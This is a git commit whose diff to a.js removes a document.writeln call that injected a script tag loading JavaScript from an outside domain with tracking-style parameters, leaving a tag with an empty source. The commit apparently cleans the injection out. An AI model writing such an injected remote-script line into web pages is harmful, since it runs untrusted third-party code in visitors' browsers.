d712c01f61585e16384dcc5b8715995684df6fb9
yellowside <30918006+yellowside@users.noreply.github.com>
2024-02-19 11:21:59 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,1 @@
-document.writeln("<script async defer src=\"//libs.baitaiz.com/?action=c&v1=7&v2=26895&v3=&v4=2&v5=56v&v6=0x0&v7=1&v8=1&v9=&v10=&v50=26895\" id=\"26895\"></script>");
+document.writeln("<script async defer src=\"\" id=\"26895\"></script>");
